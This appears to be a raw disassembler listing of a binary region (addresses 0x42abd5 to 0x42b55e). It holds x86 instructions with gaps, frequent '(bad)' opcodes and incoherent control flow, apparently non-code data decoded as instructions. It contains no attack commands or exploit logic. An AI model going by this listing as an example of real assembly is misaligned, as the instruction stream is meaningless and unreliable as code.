  42abd5:	dec    ebp
  42abd6:	cs pop ebp
  42abd8:	inc    edx
  42abd9:	add    BYTE PTR [edx+0x143e4ecd],bl
  42abdf:	or     BYTE PTR cs:[edx+0x37eab11d],bl
  42abe6:	sbb    BYTE PTR [ebp+0x63c0f559],ch
  42abec:	or     ah,ah
  42abee:	rcr    DWORD PTR [ebp+0x29],0xc1
  42abf2:	imul   esp,DWORD PTR [edx+0x3c8def5b],0xffffffb4
  42abf9:	xchg   BYTE PTR [ecx-0x28a40ff4],ch
  42abff:	scas   eax,DWORD PTR es:[edi]
  42ac00:	sub    BYTE PTR [ebx+0xc],al
  42ac03:	inc    eax
  42ac04:	das    
  42ac05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ac06:	push   ss
  42ac07:	(bad)  
  42ac08:	pushf  
  42ac09:	xor    dl,0xfa
  42ac0c:	dec    esp
  42ac0d:	mov    al,0x3f
  42ac0f:	dec    esp
  42ac10:	(bad)  
  42ac12:	scas   eax,DWORD PTR es:[edi]
  42ac13:	in     al,0x4c
  42ac15:	pop    esp
  42ac16:	push   edi
  42ac17:	fwait
  42ac18:	pop    esi
  42ac19:	cdq    
  42ac1a:	pop    edi
  42ac1b:	aad    0x81
  42ac1d:	inc    edi
  42ac1e:	adc    al,BYTE PTR [edi+0x63]
  42ac21:	add    BYTE PTR [edi+0x2b],dl
  42ac24:	and    esp,0x5e7874fd
  42ac2a:	cwde   
  42ac2b:	jl     0x42abf5
  42ac2d:	jl     0x42abda
  42ac2f:	addr16 push eax
  42ac31:	xchg   edi,eax
  42ac32:	jae    0x42ac3e
  42ac34:	add    eax,esp
  42ac36:	dec    eax
  42ac37:	call   0x9c59:0xbf109628
  42ac3e:	pop    ds
  42ac3f:	jno    0x42abc5
  42ac41:	imul   edi,eax,0xffffffab
  42ac44:	cmp    al,0xea
  42ac46:	aas    
  42ac47:	push   esp
  42ac48:	dec    esi
  42ac49:	fidiv  DWORD PTR [eax-0x1a]
  42ac4c:	or     DWORD PTR [eax-0x1d],ebp
  42ac4f:	loop   0x42ac50
  42ac51:	nop
  42ac52:	(bad)  
  42ac53:	cdq    
  42ac54:	paddb  mm1,QWORD PTR [ebp-0x79f0846f]
  42ac5b:	cmc    
  42ac5c:	mov    esi,0x96073cbe
  42ac61:	pushf  
  42ac62:	push   ebx
  42ac63:	jge    0x42acae
  42ac65:	inc    esi
  42ac66:	jb     0x42acb5
  42ac68:	xchg   BYTE PTR ds:0x2732eddf,dh
  42ac6e:	fsubr  QWORD PTR [eax+0x235e133b]
  42ac74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ac75:	dec    eax
  42ac76:	in     eax,0x32
  42ac78:	in     al,0xd9
  42ac7a:	and    DWORD PTR ds:0xce8c4ca6,0xffffffe3
  42ac81:	cmp    ebp,DWORD PTR [esi+0x22b8fa7f]
  42ac87:	add    DWORD PTR [ebx-0x433bd606],eax
  42ac8d:	mov    al,0xfd
  42ac8f:	loope  0x42ac91
	...
  42acf1:	add    BYTE PTR [eax],al
  42acf3:	add    cl,ch
  42acf5:	xor    bl,BYTE PTR [edx+edi*1]
  42acf8:	fistp  QWORD PTR [esi]
  42acfa:	out    dx,eax
  42acfb:	repz ret 
  42acfd:	fcom   DWORD PTR [edx+0x72]
  42ad00:	inc    ebx
  42ad01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ad02:	add    DWORD PTR [edx],esi
  42ad04:	lods   al,BYTE PTR ds:[esi]
  42ad05:	leave  
  42ad06:	add    DWORD PTR [eax],eax
  42ad08:	add    al,0x1
  42ad0a:	add    BYTE PTR [eax],al
  42ad0c:	sbb    eax,0x961d87a0
  42ad11:	ins    BYTE PTR es:[edi],dx
  42ad12:	lahf   
  42ad13:	dec    ecx
  42ad14:	dec    edi
  42ad15:	or     cl,BYTE PTR es:[edi+0x66]
  42ad19:	bnd jge 0x42ad45
  42ad1c:	arpl   cx,dx
  42ad1e:	mov    ecx,eax
  42ad20:	popa   
  42ad21:	loop   0x42ad44
  42ad23:	btr    DWORD PTR [ecx+ebx*8],esi
  42ad27:	inc    eax
  42ad28:	lea    ecx,[ebx-0x7b]
  42ad2b:	ret    0xd73e
  42ad2e:	mov    bl,BYTE PTR [edx-0x45718586]
  42ad34:	jl     0x42ad2e
  42ad36:	daa    
  42ad37:	test   eax,0xd58d5af4
  42ad3c:	or     ecx,edi
  42ad3e:	(bad)  
  42ad3f:	test   DWORD PTR [edx+0x33],ebp
  42ad42:	sahf   
  42ad43:	outs   dx,DWORD PTR ds:[esi]
  42ad44:	xchg   ecx,eax
  42ad45:	pushf  
  42ad46:	pop    ecx
  42ad47:	xchg   ebx,eax
  42ad48:	loope  0x42acd6
  42ad4a:	pop    esi
  42ad4b:	dec    edx
  42ad4c:	adc    DWORD PTR [ebp+edi*2+0x211f0cf9],ebp
  42ad53:	fisttp QWORD PTR [eax+0x3193eafa]
  42ad59:	or     DWORD PTR [edx-0x1d],0x325495a4
  42ad60:	arpl   WORD PTR [ebp+0x6b],bp
  42ad63:	cmp    DWORD PTR [ecx],ebp
  42ad65:	(bad)  
  42ad67:	adc    DWORD PTR [edi-0xa],edi
  42ad6a:	push   cs
  42ad6b:	adc    bh,BYTE PTR [ecx+0x403a934d]
  42ad71:	xchg   edi,eax
  42ad72:	sub    edx,DWORD PTR [esi-0x2ced0e5e]
  42ad78:	cmc    
  42ad79:	mov    esi,0x13af0f19
  42ad7e:	fbstp  TBYTE PTR [ebp-0x3818884]
  42ad84:	test   al,0xe7
  42ad86:	shl    dh,0x8
  42ad89:	pop    ebx
  42ad8a:	popf   
  42ad8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ad8c:	cli    
  42ad8d:	jno    0x42adbc
  42ad8f:	adc    eax,0x58c9bc0a
  42ad94:	sbb    al,0xde
  42ad96:	adc    ch,BYTE PTR ds:[ecx-0x7c]
  42ad9a:	jge    0x42ad28
  42ad9c:	xchg   ecx,eax
  42ad9d:	adc    bl,BYTE PTR [ebx+0x10]
  42ada0:	out    0x1f,eax
  42ada2:	xor    DWORD PTR [edi],0x3c
  42ada5:	int    0x95
  42ada7:	inc    esp
  42ada8:	sbb    bh,BYTE PTR [ebx]
  42adaa:	push   0x1c
  42adac:	adc    al,0xeb
  42adae:	mov    al,0xa3
  42adb0:	xor    dl,BYTE PTR [ecx+0x1f]
  42adb3:	add    eax,0x1357db98
  42adb8:	sub    cl,BYTE PTR ds:0xe1e626dd
  42adbe:	jecxz  0x42ae18
  42adc0:	pop    ebp
  42adc1:	and    cl,0x62
  42adc4:	rol    BYTE PTR [edx],cl
  42adc6:	jmp    DWORD PTR [eax+eiz*2+0x5c644f10]
  42adcd:	jmp    0x42adcf
  42adcf:	fs pop ebx
  42add1:	jae    0x42ae52
  42add3:	jno    0x42adfa
  42add5:	xchg   edi,eax
  42add6:	dec    esi
  42add7:	(bad)  
  42add8:	sub    DWORD PTR [ebx+0x1a],ebp
  42addb:	jp     0x42add3
  42addd:	(bad)  
  42adde:	mov    ecx,0x16024785
  42ade3:	xchg   ebx,eax
  42ade4:	es loope 0x42ae37
  42ade7:	and    al,0x38
  42ade9:	push   ecx
  42adea:	add    edx,esp
  42adec:	pop    ebp
  42aded:	loop   0x42ae0c
  42adef:	(bad)  
  42adf0:	retf   
  42adf1:	mov    dl,0x3d
  42adf3:	(bad)  
  42adf5:	jge    0x42ad77
  42adf7:	adc    dl,dh
  42adf9:	jo     0x42ad9a
  42adfb:	cs jl  0x42ae38
  42adfe:	jbe    0x42ad82
  42ae00:	push   ds
  42ae01:	lds    eax,FWORD PTR [edx-0x4d]
  42ae04:	out    0x87,eax
  42ae06:	sub    dl,al
  42ae08:	mov    esp,eax
  42ae0a:	test   al,0x7b
  42ae0c:	push   0xffffff82
  42ae0e:	adc    BYTE PTR [edi],0x0
	...
  42ae71:	add    BYTE PTR [eax],al
  42ae73:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42ae79:	mov    edi,0x7bd8f7ff
  42ae7e:	mov    dh,0xb9
  42ae80:	or     al,0x1e
  42ae82:	popa   
  42ae83:	retf   0xcab0
  42ae86:	add    DWORD PTR [eax],eax
  42ae88:	add    al,0x1
  42ae8a:	add    BYTE PTR [eax],al
  42ae8c:	sbb    BYTE PTR [eax-0x6f256bf],ah
  42ae92:	mov    ah,BYTE PTR [edi+ebp*8]
  42ae95:	bound  ecx,QWORD PTR [ebp+0xd]
  42ae98:	mov    ecx,?
  42ae9a:	hlt    
  42ae9b:	fdivr  DWORD PTR [edx]
  42ae9d:	int    0x91
  42ae9f:	adc    BYTE PTR [ebx+0x16],dl
  42aea2:	ins    DWORD PTR es:[edi],dx
  42aea3:	cld    
  42aea4:	jle    0x42ae6e
  42aea6:	shl    BYTE PTR [edx+0x5c726fb4],1
  42aeac:	rcr    DWORD PTR [ebx+0x7950bd9c],0x5f
  42aeb3:	ins    DWORD PTR es:[edi],dx
  42aeb4:	jno    0x42aeb2
  42aeb6:	ja     0x42af2b
  42aeb8:	ret    
  42aeb9:	sbb    al,0x3a
  42aebb:	fist   WORD PTR [edi+ebp*2-0x78e88079]
  42aec2:	outs   dx,BYTE PTR ds:[esi]
  42aec3:	sbb    al,0x4
  42aec5:	sub    al,0x36
  42aec7:	mov    ecx,0x4eeef1e8
  42aecc:	mov    WORD PTR [esi-0x1d],es
  42aecf:	inc    esp
  42aed0:	cmp    eax,0x4826749c
  42aed5:	ja     0x42aed4
  42aed7:	pop    esi
  42aed8:	retf   
  42aed9:	cmc    
  42aeda:	psrlq  mm4,QWORD PTR [ebp-0x7de3dcaf]
  42aee1:	int    0x9
  42aee3:	popa   
  42aee4:	dec    edi
  42aee5:	das    
  42aee6:	mov    dh,0x92
  42aee8:	cmp    al,0x82
  42aeea:	inc    ecx
  42aeeb:	call   0x32d5:0xdf04de74
  42aef2:	popa   
  42aef3:	popf   
  42aef4:	jnp    0x42af49
  42aef6:	cmc    
  42aef7:	fistp  WORD PTR [edx-0x34]
  42aefa:	xlat   BYTE PTR ds:[ebx]
  42aefb:	and    DWORD PTR [ebp-0xe],ebx
  42aefe:	lahf   
  42aeff:	and    BYTE PTR [ebx],0x8
  42af02:	inc    esp
  42af03:	push   es
  42af04:	in     al,0x6a
  42af06:	sbb    BYTE PTR [eax],al
  42af08:	ins    BYTE PTR es:[edi],dx
  42af09:	fdivp  st(4),st
  42af0b:	fcomip st,st(6)
  42af0d:	xchg   edi,eax
  42af0e:	fmul   QWORD PTR [ecx]
  42af10:	mov    al,0xdf
  42af12:	and    BYTE PTR [esi+0x6f],dh
  42af15:	ss push edi
  42af17:	retf   
  42af18:	cld    
  42af19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42af1a:	mov    ds:0x6b876b57,al
  42af1f:	inc    edi
  42af20:	adc    ah,BYTE PTR [ebx+0x5999ce2f]
  42af26:	dec    ecx
  42af27:	fbstp  TBYTE PTR [edx+edi*2-0x73818276]
  42af2e:	dec    ebx
  42af2f:	jbe    0x42af00
  42af31:	xchg   ebp,eax
  42af32:	inc    eax
  42af33:	mov    BYTE PTR [ebx+edi*1-0x27c945df],ch
  42af3a:	in     eax,0x71
  42af3c:	mov    al,ds:0x59afa0e6
  42af41:	xchg   ecx,eax
  42af42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42af43:	ins    DWORD PTR es:[edi],dx
  42af44:	jae    0x42af20
  42af46:	(bad)  
  42af47:	push   ebp
  42af48:	mov    eax,ds:0xef330a67
  42af4d:	test   eax,0x11f16b91
  42af52:	ficom  DWORD PTR [edx+0x7cb5e3f6]
  42af58:	mov    al,BYTE PTR [ebx-0x1b72d654]
  42af5e:	ror    DWORD PTR [eax],0xcb
  42af61:	sbb    eax,0xc19c9c8c
  42af66:	mov    al,ds:0x2aa20c2a
  42af6b:	in     eax,dx
  42af6c:	push   eax
  42af6d:	jae    0x42afe5
  42af6f:	cli    
  42af70:	push   cs
  42af71:	cmp    al,0xcf
  42af73:	mov    esi,0x609733f4
  42af78:	sbb    edi,DWORD PTR ss:[edi]
  42af7b:	push   es
  42af7c:	xor    BYTE PTR [edx-0x10],ah
  42af7f:	jp     0x42af96
  42af81:	push   eax
  42af82:	(bad)  
  42af83:	sti    
  42af84:	scas   al,BYTE PTR es:[edi]
  42af85:	pop    es
  42af86:	es pusha 
  42af88:	repz push edi
  42af8a:	cmp    BYTE PTR [ebx+0x46ef25a9],al
	...
  42aff4:	stc    
  42aff5:	enter  0xdc7a,0x7b
  42aff9:	(bad)  
  42affa:	(bad)  
  42affb:	in     eax,dx
  42affc:	sbb    al,0x4f
  42affe:	push   ebp
  42afff:	inc    esp
  42b000:	ret    0x5cbe
  42b003:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b004:	mov    ah,0xcb
  42b006:	add    DWORD PTR [eax],eax
  42b008:	add    al,0x1
  42b00a:	add    BYTE PTR [eax],al
  42b00c:	adc    eax,0xdf1d3531
  42b011:	or     esi,DWORD PTR [ecx+edi*4-0x15]
  42b015:	jno    0x42b080
  42b017:	mov    cl,0xbe
  42b019:	jle    0x42b089
  42b01b:	out    dx,eax
  42b01c:	jmp    0x42afd4
  42b01e:	pop    edi
  42b01f:	std    
  42b020:	pop    ds
  42b021:	scas   eax,DWORD PTR es:[edi]
  42b022:	xchg   al,ah
  42b024:	or     al,0xf6
  42b026:	add    eax,0xe34ae9b6
  42b02b:	mov    dh,0x3b
  42b02d:	ins    DWORD PTR es:[edi],dx
  42b02e:	inc    esi
  42b02f:	cmp    ch,bh
  42b031:	fwait
  42b032:	ja     0x42b083
  42b034:	xchg   edi,eax
  42b035:	in     al,0x9e
  42b037:	cmc    
  42b038:	xor    eax,0x63be009e
  42b03d:	xor    ecx,DWORD PTR [edi]
  42b03f:	pop    es
  42b040:	cmp    bh,ch
  42b042:	mov    esp,0x32c8ad3c
  42b047:	jmp    DWORD PTR [esi-0x4d]
  42b04a:	out    0xc9,al
  42b04c:	ss inc edx
  42b04e:	xchg   al,dl
  42b050:	cmp    al,0xd6
  42b052:	sbb    edx,eax
  42b054:	call   0x165b:0x17a9800d
  42b05b:	adc    DWORD PTR [ebx+ebx*1-0x14],ebp
  42b05f:	push   edi
  42b060:	cmp    eax,0x56038490
  42b065:	ds out 0xef,eax
  42b068:	retf   
  42b069:	xor    bl,BYTE PTR [esi+ebp*4-0x1e933752]
  42b070:	sti    
  42b071:	out    dx,eax
  42b072:	bnd jno 0x42b043
  42b075:	(bad)  
  42b076:	sahf   
  42b077:	lods   al,BYTE PTR ds:[esi]
  42b078:	cmp    ah,BYTE PTR [edx+0x23]
  42b07b:	sbb    ebx,DWORD PTR [ebx+0x66]
  42b07e:	xor    BYTE PTR [ebx],bl
  42b080:	pop    ecx
  42b081:	(bad)  
  42b082:	cmp    dh,BYTE PTR [ebx-0x120cf35b]
  42b088:	push   ebp
  42b089:	dec    edi
  42b08a:	xchg   esi,eax
  42b08b:	sti    
  42b08c:	popa   
  42b08d:	mov    eax,0x15b927fe
  42b092:	mov    ah,0xe8
  42b094:	pop    esp
  42b095:	and    DWORD PTR [edi+eiz*8],0xffffffbd
  42b099:	cwde   
  42b09a:	mov    ds:0x339d5172,eax
  42b09f:	jmp    0x42b055
  42b0a1:	jmp    0xd5c54133
  42b0a6:	js     0x42b074
  42b0a8:	add    ah,ch
  42b0aa:	mov    eax,0xdbe0c9be
  42b0af:	pop    edi
  42b0b0:	test   BYTE PTR [eax+0x18],dh
  42b0b3:	popf   
  42b0b4:	inc    edx
  42b0b5:	pushf  
  42b0b6:	mov    edx,0xe10b4f92
  42b0bb:	mov    edi,0x25b17b27
  42b0c0:	cs sbb al,0x3
  42b0c3:	mov    bl,0xf4
  42b0c5:	scas   al,BYTE PTR es:[edi]
  42b0c6:	cmp    edx,DWORD PTR [ebp+eax*8-0x54]
  42b0ca:	or     dl,BYTE PTR [esi-0x7ed84b18]
  42b0d0:	sbb    dh,BYTE PTR [ebp-0xc]
  42b0d3:	jmp    0xc3855043
  42b0d8:	fxch   st(6)
  42b0da:	xor    eax,0x8ddca7a9
  42b0df:	jmp    0xd6c25b72
  42b0e4:	mov    bl,0x9e
  42b0e6:	lock and DWORD PTR [eax+0x3e5040b],edx
  42b0ed:	std    
  42b0ee:	inc    edi
  42b0ef:	mov    edx,DWORD PTR [ebp-0x64]
  42b0f2:	mov    dh,0xdc
  42b0f4:	jge    0x42b0f1
  42b0f6:	or     BYTE PTR [ecx+ecx*8],0xf8
  42b0fa:	jg     0x42b135
  42b0fc:	jl     0x42b0e7
  42b0fe:	cmp    esp,DWORD PTR [eax+0x2f]
  42b101:	(bad)  [edi-0x5c]
  42b104:	iret   
  42b105:	scas   al,BYTE PTR es:[edi]
  42b106:	sbb    edx,esp
  42b108:	mov    esi,0xbbc354ec
  42b10d:	shl    BYTE PTR [edi+0xfa],0x0
	...
  42b174:	jne    0x42b19b
  42b176:	imul   ebx,DWORD PTR [edi-0x51]
  42b17a:	cmc    
  42b17b:	call   eax
  42b17d:	inc    ebx
  42b17e:	push   edi
  42b17f:	popa   
  42b180:	mov    edi,0xb894fbe8
  42b185:	int3   
  42b186:	add    DWORD PTR [eax],eax
  42b188:	add    al,0x1
  42b18a:	add    BYTE PTR [eax],al
  42b18c:	jo     0x42b117
  42b18e:	rsqrtps xmm7,XMMWORD PTR [ebx]
  42b191:	push   eax
  42b193:	mov    ecx,0xc82d1138
  42b198:	inc    ecx
  42b199:	pop    DWORD PTR [ebx]
  42b19b:	(bad)  
  42b19c:	and    ch,BYTE PTR [eax]
  42b19e:	(bad)  
  42b19f:	aam    0x68
  42b1a1:	dec    ebp
  42b1a2:	cld    
  42b1a3:	out    dx,eax
  42b1a4:	sub    bl,BYTE PTR [edx+ebx*4+0x25979f6]
  42b1ab:	bound  ecx,QWORD PTR [eax-0x33]
  42b1ae:	mov    esi,0x3730f867
  42b1b3:	dec    esp
  42b1b4:	and    al,0x8a
  42b1b6:	add    dh,dl
  42b1b8:	dec    esi
  42b1b9:	loop   0x42b214
  42b1bb:	or     DWORD PTR [ebx-0x28],eax
  42b1be:	cli    
  42b1bf:	push   esi
  42b1c0:	xor    esp,DWORD PTR [esi-0x80]
  42b1c3:	or     al,0xf6
  42b1c5:	dec    esi
  42b1c6:	add    eax,0xfc8d9632
  42b1cb:	or     BYTE PTR [esi+eiz*4-0x11],0xd3
  42b1d0:	rol    BYTE PTR [eax+0x4b],cl
  42b1d3:	rcr    BYTE PTR ds:0xa0d1849e,cl
  42b1d9:	push   ss
  42b1da:	push   edi
  42b1db:	or     eax,0x871e8a5e
  42b1e0:	xor    DWORD PTR [ecx+0x47cc589f],esi
  42b1e6:	ins    DWORD PTR es:[edi],dx
  42b1e7:	leave  
  42b1e8:	push   ds
  42b1e9:	gs or  al,0xef
  42b1ec:	lods   al,BYTE PTR ds:[esi]
  42b1ed:	sbb    al,0xf8
  42b1ef:	dec    ebp
  42b1f0:	mov    edi,0xddfc3c6a
  42b1f5:	pop    ebp
  42b1f6:	daa    
  42b1f7:	nop
  42b1f8:	inc    ecx
  42b1f9:	pop    edi
  42b1fa:	in     al,dx
  42b1fb:	nop
  42b1fc:	enter  0x5647,0xb2
  42b200:	into   
  42b201:	div    bl
  42b203:	ins    DWORD PTR es:[edi],dx
  42b204:	dec    ecx
  42b205:	iret   
  42b206:	rcr    DWORD PTR [ecx+0x41],1
  42b209:	push   edx
  42b20a:	pop    esi
  42b20b:	xor    BYTE PTR [ebx+ebx*2+0x25b46702],ch
  42b212:	jl     0x42b1ed
  42b214:	hlt    
  42b215:	sar    edi,1
  42b217:	pop    ebx
  42b218:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b219:	imul   esp,DWORD PTR [edi+0x7d],0x36732697
  42b220:	es mov edx,0xd1b380fc
  42b226:	add    edx,DWORD PTR [esi]
  42b228:	sub    ecx,DWORD PTR [edx+0x736addf3]
  42b22e:	xchg   edx,esp
  42b230:	int3   
  42b231:	and    DWORD PTR [esi-0x5],eax
  42b234:	test   eax,0xa44909ec
  42b239:	setl   BYTE PTR [ebx-0x13]
  42b23d:	rcr    BYTE PTR [ebx-0x2ddf4ab8],cl
  42b243:	cld    
  42b244:	mov    edx,0xf415f69e
  42b249:	mov    ch,0xf5
  42b24b:	mov    eax,0xbe6cf239
  42b250:	inc    ebp
  42b251:	call   0xb08fa16e
  42b256:	pop    ds
  42b257:	xlat   BYTE PTR ds:[ebx]
  42b258:	adc    ebx,DWORD PTR [edi-0x53]
  42b25b:	enter  0xf40d,0x12
  42b25f:	push   ebx
  42b260:	lods   al,BYTE PTR ds:[esi]
  42b261:	mov    eax,cs
  42b263:	inc    ebp
  42b264:	sbb    edx,0x19
  42b267:	cdq    
  42b268:	in     eax,dx
  42b269:	cmp    al,0x97
  42b26b:	mov    dh,0xce
  42b26d:	addr16 or al,0x40
  42b270:	div    BYTE PTR [edx]
  42b272:	mov    ah,0xc0
  42b274:	leave  
  42b275:	nop
  42b276:	icebp  
  42b277:	jecxz  0x42b273
  42b279:	cmc    
  42b27a:	popa   
  42b27b:	call   0xb90b:0x8d5d17f9
  42b282:	cwde   
  42b283:	(bad)  
  42b285:	pushf  
  42b286:	into   
  42b287:	cmp    ecx,DWORD PTR [ecx+0x18a0e29f]
  42b28d:	and    al,0x80
  42b28f:	cmp    eax,0x0
	...
  42b2f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b2f5:	mov    ds,WORD PTR [ecx-0x28844a0]
  42b2fb:	iret   
  42b2fc:	sub    eax,0x26738e65
  42b301:	mov    eax,ds:0xcdbcc91d
  42b306:	add    DWORD PTR [eax],eax
  42b308:	add    al,0x1
  42b30a:	add    BYTE PTR [eax],al
  42b30c:	shr    DWORD PTR [esi-0x498703f3],0x7b
  42b313:	xchg   ebx,eax
  42b314:	in     eax,0xa0
  42b316:	xchg   DWORD PTR [edx+0x15692324],ebp
  42b31c:	cmp    BYTE PTR [esi+0x37],bh
  42b31f:	add    BYTE PTR ds:0xe91cca17,ah
  42b325:	xchg   esi,eax
  42b326:	push   es
  42b327:	cdq    
  42b328:	fstp   TBYTE PTR [ebp*2-0xb54be53]
  42b32f:	fdiv   QWORD PTR [edi]
  42b331:	mov    DWORD PTR [ebp+0x3379243a],edi
  42b337:	iret   
  42b338:	dec    ebx
  42b339:	mov    ah,0x64
  42b33b:	mov    ds:0x3ffaaf98,eax
  42b340:	lahf   
  42b341:	call   0x6f7b:0x54c7fe38
  42b348:	cmp    DWORD PTR [ebp+0x5c],ebx
  42b34b:	mov    eax,0xe56d7c92
  42b350:	mov    dh,0x3c
  42b352:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b353:	mov    eax,ds:0x2ba9fa54
  42b358:	jmp    0xd61d0737
  42b35d:	push   ss
  42b35e:	push   es
  42b35f:	sahf   
  42b360:	cmp    dl,BYTE PTR [esi+ebp*1+0x6ed45495]
  42b367:	stos   BYTE PTR es:[edi],al
  42b368:	test   al,0x49
  42b36a:	repz jmp 0x466ec134
  42b370:	inc    ebx
  42b371:	inc    DWORD PTR [edi+0x2052048f]
  42b377:	cmp    ch,BYTE PTR [ecx+edi*4-0x28]
  42b37b:	popf   
  42b37c:	idiv   BYTE PTR [edx+ebx*2+0x2]
  42b380:	add    esp,ecx
  42b382:	adc    dl,al
  42b384:	and    edx,ebp
  42b386:	push   ecx
  42b387:	sub    esi,DWORD PTR ds:0x989ffe80
  42b38d:	inc    edi
  42b38e:	nop
  42b38f:	aaa    
  42b390:	jnp    0x42b31d
  42b392:	stos   DWORD PTR es:[edi],eax
  42b393:	(bad)  
  42b394:	mov    bl,0xc8
  42b396:	xchg   edi,eax
  42b397:	cld    
  42b398:	and    eax,esp
  42b39a:	fisub  WORD PTR [edi+0x8]
  42b39d:	mov    cl,0x95
  42b39f:	push   esp
  42b3a0:	pop    ds
  42b3a1:	loopne 0x42b3e3
  42b3a3:	xor    dl,ah
  42b3a5:	das    
  42b3a6:	out    dx,al
  42b3a7:	xchg   ebx,eax
  42b3a9:	sti    
  42b3aa:	adc    eax,0x19ef114f
  42b3af:	inc    edx
  42b3b0:	mov    bl,0x53
  42b3b2:	sub    BYTE PTR [eax-0x62589c98],bh
  42b3b8:	pop    esi
  42b3b9:	nop
  42b3ba:	and    al,0x6e
  42b3bc:	mov    ebp,0x712dd385
  42b3c1:	pop    edx
  42b3c2:	daa    
  42b3c3:	or     cl,BYTE PTR [edi]
  42b3c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b3c6:	sbb    edx,esp
  42b3c8:	xor    eax,0xc55112cc
  42b3cd:	imul   edi,DWORD PTR [ebx-0x4d743d97],0x53
  42b3d4:	sub    DWORD PTR [esi+0x31],ebp
  42b3d7:	mov    dh,0xb8
  42b3d9:	arpl   sp,dx
  42b3db:	mov    cl,0xba
  42b3dd:	ret    
  42b3de:	not    DWORD PTR [edx+ebp*2]
  42b3e1:	sub    ebp,DWORD PTR [ebx-0x331ea594]
  42b3e7:	push   eax
  42b3e8:	ja     0x42b421
  42b3ea:	sti    
  42b3eb:	stc    
  42b3ec:	push   0xffffffe8
  42b3ee:	test   eax,0x252ed62d
  42b3f3:	or     ch,BYTE PTR [edi+0x78]
  42b3f6:	push   es
  42b3f7:	pop    edi
  42b3f8:	in     eax,0x37
  42b3fa:	sti    
  42b3fb:	push   ebx
  42b3fc:	or     eax,0x219b31cd
  42b401:	into   
  42b402:	sbb    DWORD PTR [ebx+edx*2],0x61c3aae7
  42b409:	out    0x35,al
  42b40b:	dec    ebp
  42b40c:	xlat   BYTE PTR ds:[ebx]
  42b40d:	inc    ebx
  42b40e:	neg    DWORD PTR [eax+0x0]
	...
  42b471:	add    BYTE PTR [eax],al
  42b473:	add    BYTE PTR [edx-0x1011dfbb],cl
  42b479:	out    dx,eax
  42b47a:	into   
  42b47b:	gs jo  0x42b44e
  42b47e:	cld    
  42b47f:	test   DWORD PTR [eax-0x3f999e48],ebx
  42b485:	into   
  42b486:	add    DWORD PTR [eax],eax
  42b488:	add    al,0x1
  42b48a:	add    BYTE PTR [eax],al
  42b48c:	xor    DWORD PTR [ebp-0x6864251b],esp
  42b492:	rol    DWORD PTR [esi-0x68],cl
  42b495:	imul   edx,DWORD PTR [ebx-0x13afbba8],0x62
  42b49c:	retf   
  42b49d:	mov    ah,0xe7
  42b49f:	or     eax,0x63d57663
  42b4a4:	mov    al,ds:0x652b0605
  42b4a9:	cmp    ch,al
  42b4ab:	into   
  42b4ac:	dec    edx
  42b4ad:	test   al,0xe1
  42b4af:	jmp    0x238d:0xadd323fe
  42b4b6:	out    dx,eax
  42b4b7:	test   BYTE PTR [ecx+0x385953c9],dl
  42b4bd:	mov    bl,0xfa
  42b4bf:	loopne 0x42b4ba
  42b4c1:	stos   DWORD PTR es:[edi],eax
  42b4c2:	loopne 0x42b51b
  42b4c4:	xor    DWORD PTR [ebp-0x20ea5a91],ebp
  42b4ca:	in     eax,dx
  42b4cb:	leave  
  42b4cc:	test   cl,ah
  42b4ce:	into   
  42b4cf:	push   eax
  42b4d0:	pusha  
  42b4d1:	xchg   bh,dh
  42b4d3:	xor    bh,BYTE PTR [ebp-0x36]
  42b4d6:	in     eax,dx
  42b4d7:	out    dx,eax
  42b4d8:	jne    0x42b52a
  42b4da:	dec    ebx
  42b4db:	mov    ds:0x1142321c,eax
  42b4e0:	test   BYTE PTR [eax-0x7],dh
  42b4e3:	(bad)  
  42b4e4:	xlat   BYTE PTR ds:[ebx]
  42b4e5:	out    dx,eax
  42b4e6:	sar    BYTE PTR gs:[ebx],0x5f
  42b4ea:	shl    BYTE PTR [ebp+0x40],cl
  42b4ed:	mov    ch,0xe
  42b4ef:	fnstcw WORD PTR [ebp-0x4203a83e]
  42b4f5:	pusha  
  42b4f6:	int    0x17
  42b4f8:	mov    ds:0x32d6530b,eax
  42b4fd:	retf   0xf2d5
  42b500:	inc    edi
  42b501:	or     DWORD PTR [edi-0x3c],ecx
  42b504:	lds    edi,FWORD PTR [ecx-0x32f7d8a3]
  42b50a:	xor    al,0x6d
  42b50c:	inc    ebp
  42b50d:	popa   
  42b50e:	mov    ecx,0x6828073
  42b513:	xchg   ebx,eax
  42b514:	jno    0x42b535
  42b516:	div    cl
  42b518:	inc    eax
  42b519:	dec    ecx
  42b51a:	mov    cl,0xca
  42b51c:	mov    bl,0x17
  42b51e:	stos   BYTE PTR es:[edi],al
  42b51f:	pop    eax
  42b520:	xchg   edx,eax
  42b521:	jae    0x42b598
  42b523:	sbb    ah,BYTE PTR [esi+0x99e38e6]
  42b529:	mov    ch,0x7f
  42b52b:	inc    esp
  42b52c:	mov    eax,ds:0x63a9c5e3
  42b531:	orps   xmm6,XMMWORD PTR [ecx+0x27]
  42b535:	cmc    
  42b536:	div    BYTE PTR [eax+eiz*1-0x22]
  42b53a:	mov    DWORD PTR [eax],esp
  42b53c:	dec    cl
  42b53e:	loopne 0x42b560
  42b540:	hlt    
  42b541:	dec    edx
  42b542:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b543:	mov    edi,?
  42b545:	jecxz  0x42b5b2
  42b547:	test   al,0x6a
  42b549:	push   esi
  42b54a:	and    dl,bh
  42b54c:	mov    BYTE PTR [eax],0x67
  42b54f:	iret   
  42b550:	mov    DWORD PTR [edx],ecx
  42b552:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b553:	xchg   edx,eax
  42b554:	mov    ch,0x28
  42b556:	jae    0x42b531
  42b558:	push   es
  42b559:	stos   DWORD PTR es:[edi],eax
  42b55a:	cwde   
  42b55b:	stc    
  42b55c:	loope  0x42b5c4
  42b55e:	sbb    ebp,eax
